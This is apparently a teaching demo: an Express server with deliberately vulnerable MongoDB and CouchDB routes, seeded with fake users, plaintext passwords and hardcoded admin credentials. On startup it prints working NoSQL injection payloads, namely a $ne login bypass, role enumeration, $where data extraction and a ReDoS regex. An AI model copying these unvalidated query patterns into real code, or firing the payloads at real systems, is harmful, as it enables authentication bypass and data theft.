/******************************************************************
 * DEMO DE INYECCIÓN NoSQL - MongoDB y CouchDB
 * Para demostrar vulnerabilidades de inyección en bases NoSQL
 ******************************************************************/
const express = require("express");
const body = require("body-parser");
const { MongoClient } = require("mongodb");
const nano = require("nano"); // CouchDB client
const app = express();
app.use(body.json());

/* ---------- Conexiones ---------- */
const mongo = new MongoClient("mongodb://localhost:27017");
const couch = nano("http://admin:password@localhost:5984"); // CouchDB

let usersM; // colección MongoDB
let usersC; // database CouchDB

/******************************************************************
 * 1. RUTAS VULNERABLES PARA DEMOSTRACIÓN
 ******************************************************************/

// MongoDB - Vulnerable a NoSQL injection
app.post("/login-mongo", async (req, res) => {
    try {
        const { email, password } = req.body;
        console.log("📊 MongoDB Query:", { email, password });
        
        // VULNERABLE: acepta objetos directamente sin validación
        const user = await usersM.findOne({ email, password });
        
        return user 
            ? res.json({ 
                ok: true, 
                user, 
                message: "MongoDB Login successful!",
                database: "MongoDB"
              })
            : res.status(401).json({ ok: false, message: "Invalid credentials" });
    } catch (error) {
        console.error("❌ MongoDB Error:", error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// CouchDB - Vulnerable a NoSQL injection
app.post("/login-couch", async (req, res) => {
    try {
        const { email, password } = req.body;
        console.log("📊 CouchDB Query params:", { email, password });
        
        // VULNERABLE: construcción de query sin validación
        const selector = {
            email: email,
            password: password
        };
        
        const result = await usersC.find({ selector });
        const user = result.docs[0];
        
        return user
            ? res.json({ 
                ok: true, 
                user, 
                message: "CouchDB Login successful!",
                database: "CouchDB"
              })
            : res.status(401).json({ ok: false, message: "Invalid credentials" });
    } catch (error) {
        console.error("❌ CouchDB Error:", error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// MongoDB - Búsqueda vulnerable por rol
app.post("/users-by-role-mongo", async (req, res) => {
    try {
        const { role } = req.body;
        console.log("📊 MongoDB Role Query:", { role });
        
        // VULNERABLE: permite inyección de operadores
        const users = await usersM.find({ role }).toArray();
        
        res.json({ 
            ok: true, 
            users, 
            count: users.length,
            database: "MongoDB"
        });
    } catch (error) {
        console.error("❌ MongoDB Role Error:", error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// MongoDB - Búsqueda vulnerable con regex
app.post("/search-mongo", async (req, res) => {
    try {
        const { query } = req.body;
        console.log("📊 MongoDB Search Query:", { query });
        
        // VULNERABLE: permite inyección de regex
        const users = await usersM.find({
            $or: [
                { email: { $regex: query } },
                { role: { $regex: query } }
            ]
        }).toArray();
        
        res.json({ 
            ok: true, 
            users, 
            count: users.length,
            database: "MongoDB"
        });
    } catch (error) {
        console.error("❌ MongoDB Search Error:", error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// Ruta para mostrar todos los usuarios
app.get("/users", async (req, res) => {
    try {
        const mongoUsers = await usersM.find({}).toArray();
        
        let couchUsers = [];
        try {
            const couchResult = await usersC.find({ selector: {} });
            couchUsers = couchResult.docs;
        } catch (e) {
            console.log("ℹ️  CouchDB not available for listing");
        }
        
        res.json({
            mongodb: {
                count: mongoUsers.length,
                users: mongoUsers
            },
            couchdb: {
                count: couchUsers.length,
                users: couchUsers
            }
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Ruta para reset de datos
app.post("/reset", async (req, res) => {
    try {
        await setupDatabases();
        res.json({ ok: true, message: "Databases reset successfully" });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

/******************************************************************
 * 2. FUNCIONES DE CONFIGURACIÓN
 ******************************************************************/
async function setupDatabases() {
    /* MongoDB Setup */
    console.log("📦 Setting up MongoDB...");
    await usersM.deleteMany({});
    await usersM.insertMany([
        {
            _id: "admin_001",
            email: "admin@company.com",
            password: "SuperSecret123!",
            role: "admin",
            resetToken: "abc123xyz",
            salary: 120000,
            department: "IT"
        },
        {
            _id: "user_001", 
            email: "john@company.com",
            password: "mypassword",
            role: "user",
            resetToken: "def456uvw",
            salary: 50000,
            department: "Sales"
        },
        {
            _id: "user_002",
            email: "mary@company.com", 
            password: "secret789",
            role: "manager",
            resetToken: "ghi789rst",
            salary: 75000,
            department: "Marketing"
        }
    ]);
    console.log("✅ MongoDB setup complete");

    /* CouchDB Setup */
    try {
        console.log("📦 Setting up CouchDB...");
        
        // Intentar crear la base de datos
        try {
            await couch.db.create('demo_users');
        } catch (e) {
            if (!e.message.includes('exists')) {
                throw e;
            }
        }
        
        usersC = couch.db.use('demo_users');
        
        // Limpiar documentos existentes
        try {
            const existingDocs = await usersC.find({ selector: {} });
            for (const doc of existingDocs.docs) {
                await usersC.destroy(doc._id, doc._rev);
            }
        } catch (e) {
            // Ignorar si no hay documentos
        }
        
        // Insertar datos de prueba
        const couchUsers = [
            {
                _id: "couch_admin_001",
                email: "admin@company.com",
                password: "SuperSecret123!",
                role: "admin", 
                resetToken: "abc123xyz",
                salary: 120000,
                department: "IT"
            },
            {
                _id: "couch_user_001",
                email: "john@company.com",
                password: "mypassword", 
                role: "user",
                resetToken: "def456uvw",
                salary: 50000,
                department: "Sales"
            }
        ];
        
        for (const user of couchUsers) {
            await usersC.insert(user);
        }
        
        console.log("✅ CouchDB setup complete");
    } catch (couchError) {
        console.log("⚠️  CouchDB not available:", couchError.message);
        console.log("ℹ️  Demo will work with MongoDB only");
    }
}

/******************************************************************
 * 3. BOOTSTRAP
 ******************************************************************/
(async () => {
    try {
        console.log("🚀 Starting NoSQL Injection Demo...");
        
        /* Conectar a MongoDB */
        console.log("🔌 Connecting to MongoDB...");
        await mongo.connect();
        usersM = mongo.db("security_demo").collection("users");
        console.log("✅ MongoDB connected");
        
        /* Configurar bases de datos */
        await setupDatabases();

        /* Servidor listo */
        app.listen(3000, () => {
            console.log("⚡ API listening on http://localhost:3000");
            console.log("\n🔥 DEMO DE INYECCIÓN NoSQL:");
            console.log("=" .repeat(50));
            console.log("📌 Endpoints vulnerables:");
            console.log("   POST /login-mongo     (MongoDB injection)");
            console.log("   POST /login-couch     (CouchDB injection)");
            console.log("   POST /users-by-role-mongo (Role injection)");
            console.log("   POST /search-mongo    (Regex injection)");
            console.log("   GET  /users          (Ver todos los datos)");
            console.log("   POST /reset          (Reset databases)");
            
            console.log("\n🎯 EJEMPLOS DE PAYLOADS:");
            console.log("=" .repeat(50));
            
            console.log("\n1️⃣  LOGIN BYPASS (MongoDB):");
            console.log('curl -X POST http://localhost:3000/login-mongo \\');
            console.log('  -H "Content-Type: application/json" \\');
            console.log('  -d \'{"email": {"$ne": null}, "password": {"$ne": null}}\'');
            
            console.log("\n2️⃣  ROLE ENUMERATION:");
            console.log('curl -X POST http://localhost:3000/users-by-role-mongo \\');
            console.log('  -H "Content-Type: application/json" \\');
            console.log('  -d \'{"role": {"$ne": null}}\'');
            
            console.log("\n3️⃣  DATA EXTRACTION:");
            console.log('curl -X POST http://localhost:3000/search-mongo \\');
            console.log('  -H "Content-Type: application/json" \\');
            console.log('  -d \'{"query": {"$where": "this.salary > 100000"}}\'');
            
            console.log("\n4️⃣  REGEX DOS ATTACK:");
            console.log('curl -X POST http://localhost:3000/search-mongo \\');
            console.log('  -H "Content-Type: application/json" \\');
            console.log('  -d \'{"query": "^(a+)+$"}\'');
            
            console.log("\n📚 Para más ejemplos: http://localhost:3000/users");
            console.log("=" .repeat(50));
        });
        
    } catch (err) {
        console.error("❌ Boot failed:", err);
        process.exit(1);
    }
})();